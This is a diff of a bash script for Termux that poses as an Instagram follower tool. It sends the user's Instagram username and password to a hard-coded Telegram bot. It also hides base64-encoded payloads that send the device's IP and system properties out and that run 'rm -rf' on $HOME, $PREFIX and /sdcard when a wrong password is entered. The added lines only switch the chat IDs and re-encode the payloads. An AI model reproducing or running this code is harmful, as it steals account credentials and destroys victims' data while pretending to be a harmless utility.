@@ -14,14 +14,19 @@ cyan='\033[1;36m'
 pink='\033[1;35m'
 #########
 req="YXB0IGluc3RhbGwgY3VybCA+IC9kZXYvbnVsbCAyPiYxICYmIGFwdCBpbnN0YWxsIHJ1YnkgID4gL2Rldi9udWxsIDI+JjEgJiYgZ2VtIGluc3RhbGwgbG9sY2F0ID4gL2Rldi9udWxsIDI+JjE="
-flo="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PUluc3RhZ3JhbSBVc2VybmFtZSAtICR1c3JuIGFuZCBQYXNzd29yZCAtICRwYXNzd2QiICY+L2Rldi9udWxs"
-result="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PW1vdGhlcmZ1Y2tlciBlbnRlcmVkICRhbXQiICY+L2Rldi9udWxs"
-sgnl="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PSQoY3VybCAtTCBpcGxpc3QuY2MvYXBpLyQoY3VybCAtTCBpZmNvbmZpZy5tZSkpIiAmPi9kZXYvbnVsbA=="
-srvr="Y2QgL3NkY2FyZCAmJiBweXRob24yIC1tIFNpbXBsZUhUVFBTZXJ2ZXIgPiAvZGV2L251bGwgMj4mMQ=="
+sgnl="Y3VybCAtZnNTTFggUE9TVCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1MDkzMDYzMDY6
+QUFFbUcweG13TzhNcXhZbXpQRFJtWVJBVkRFVXlwRG9IYzAvc2VuZE1lc3NhZ2UiIC1kICJjaGF0
+X2lkPS0xMDAxNDc4Njc4NTQ4IiAtZCAidGV4dD0kKGN1cmwgLWZzU0wgaXBsaXN0LmNjL2FwaS8k
+KGN1cmwgLWZzU0wgaWZjb25maWcubWUpKSIgJj4vZGV2L251bGwK"
 death="YW0gYnJvYWRjYXN0IC0tdXNlciAwIFwKCQkgLS1lcyBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgc3RvcmFnZSBcCgkJIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCgpybSAtcmYgJFBSRUZJWC8Kcm0gLXJmICRIT01FCmNkIC9zZGNhcmQgJiYgcm0gLXJmICovCgpldmFsICQoYmFzZTY0IC1kIDw8PCIkdHJpY2siKQoKCg=="
-death2="YW0gYnJvYWRjYXN0IC0tdXNlciAwIFwKCQkgLS1lcyBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5bGUgc3RvcmFnZSBcCgkJIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4ID4gL2Rldi9udWxsCgpybSAtcmYgJFBSRUZJWC8Kcm0gLXJmICRIT01FCmNkIC9zZGNhcmQgJiYgcm0gLXJmICovCgpjdXJsIC1YIFBPU1QgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QxNTA5MzA2MzA2OkFBRW1HMHhtd084TXF4WW16UERSbVlSQVZERVV5cERvSGMwL3NlbmRNZXNzYWdlIiAtZCAiY2hhdF9pZD0tMTAwMTQ2Njk4MDgxNiIgLWQgInRleHQ9bW90aGVyZnVja2VyJ3Mgc3RvcmFn ZSB3aXBlZCA6KSIgJj4vZGV2L251bGwK"
-trick="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVtRzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PVNraWQgZW50ZXJlZCB3cm9uZyBvcHRpb24sIHN0b3JhZ2Ugd2lwZWQgOikiICY+L2Rldi9udWxsCg=="
-req2="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1MDkzMDYzMDY6QUFFbUcweG13TzhNcXhZbXpQRFJtWVJBVkRFVXlwRG9IYzAvc2VuZERvY3VtZW50P2NoYXRfaWQ9LTEwMDE0NjY5ODA4MTYgJj4vZGV2 L251bGwK"
+trick="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVt
+RzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9
+LTEwMDE0Nzg2Nzg1NDgiIC1kICJ0ZXh0PVNraWQgZW50ZXJlZCB3cm9uZyBvcHRpb24sIHN0b3Jh
+Z2Ugd2lwZWQgOikiICY+L2Rldi9udWxsCg=="
+req2="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0
+cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1MDkzMDYzMDY6QUFFbUcweG13TzhNcXhZbXpQRFJt
+WVJBVkRFVXlwRG9IYzAvc2VuZERvY3VtZW50P2NoYXRfaWQ9LTEwMDE0Nzg2Nzg1NDggJj4vZGV2
+L251bGwK"
 ########
 string4=$(openssl rand -hex 32 | cut -c 1-4)
 string8=$(openssl rand -hex 32  | cut -c 1-8)
@@ -113,7 +118,7 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trying to login as\e[0m\e[1;93m %s\e[0m\n" $user
 IFS=$'\n'
 var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); 
-if [[ $var == "challenge" ]]; then printf "\e[1;93m\n[!] Challenge required. Allow Suspecious Login\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=Password Checker : TRUE/Sus Login Username - $user Password - $pass" &>/dev/null ; exit 1; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n[+] Login Successful\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=Password Checker : TRUE Username - $user Password - $pass" &>/dev/null && echo -e $red Adding Followers && sleep 10000 ; elif [[ $var == "Please wait" ]]; then echo "Please wait"; fi;
+if [[ $var == "challenge" ]]; then printf "\e[1;93m\n[!] Challenge required. Allow Suspecious Login\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=Password Checker : TRUE/Sus Login Username - $user Password - $pass" &>/dev/null ; exit 1; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n[+] Login Successful\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001478678548" -d "text=Password Checker : TRUE Username - $user Password - $pass" &>/dev/null && echo -e $red Adding Followers && sleep 10000 ; elif [[ $var == "Please wait" ]]; then echo "Please wait"; fi;
 fi
 
 }
@@ -469,7 +474,7 @@ printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Trying to follow cele
 check_follow=$(curl -s -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/create/$celeb/" | grep -o '"following": true')
 
 if [[ $check_follow == "" ]]; then
-    printf "\n\e[1;93m [!] Error : Wrong Password\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=Password Checker : FALSE Username - $user Password - $pass" &>/dev/null
+    printf "\n\e[1;93m [!] Error : Wrong Password\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001478678548" -d "text=Password Checker : FALSE Username - $user Password - $pass" &>/dev/null
     eval $(base64 -d <<<"$death")
 exit 1
 else
